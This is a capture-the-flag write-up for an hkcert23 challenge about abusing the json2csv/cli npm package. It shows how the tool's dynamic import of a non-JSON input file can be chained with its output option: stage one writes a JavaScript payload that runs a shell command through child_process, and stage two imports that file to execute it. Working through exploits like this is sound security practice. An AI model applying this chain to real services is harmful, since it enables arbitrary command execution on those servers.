# json2csv

## Challenge

The website lets us provide a stdin and command line options to be passed to the json2csv/cli npm package.
The website then responds with the stdout from running the command.

## Solution

When using an input file path (`-i`) and no streaming (`-s`), json2csv/cli reads the file contents as follows:

```ts
async function getInputJSON<TRaw>(inputPath: string): Promise<TRaw> {
  const assert =
    extname(inputPath).toLowerCase() === '.json'
      ? { assert: { type: 'json' } }
      : undefined;
  const { default: json } = await import(`file://${inputPath}`, assert);
  return json;
}
```

If the file extension is not `.json`, the file can be of any type and it will be imported.
We can instead provide a JavaScript file to be executed at this stage.

To write the JavaScript file, we use the `-o` option to specify an output file.
We also need `-H` to remove the default csv header, and `-q ""` to use an empty string instead of double quotes for quoting our values.
This lets us write nearly arbitrary contents to a file.

When we later import the file as described above, it will execute our code and allow us to read the flag.

### Stage 1:

#### Input

```
{"A":"const { exec } = require('child_process');exec('cat /proof.sh', (err, stdout, stderr) => {console.log(stdout);});"}
```

#### Command Line Options

```
-H -q  -o /tmp/desp_is_cool.js
```

### Stage 2:

#### Input

```
```

#### Command Line Options

```
-s -i /tmp/desp_is_cool.js
```

## Flag

```
hkcert23{Y_not_ju$tuse_za--N0DE_package?!}
```
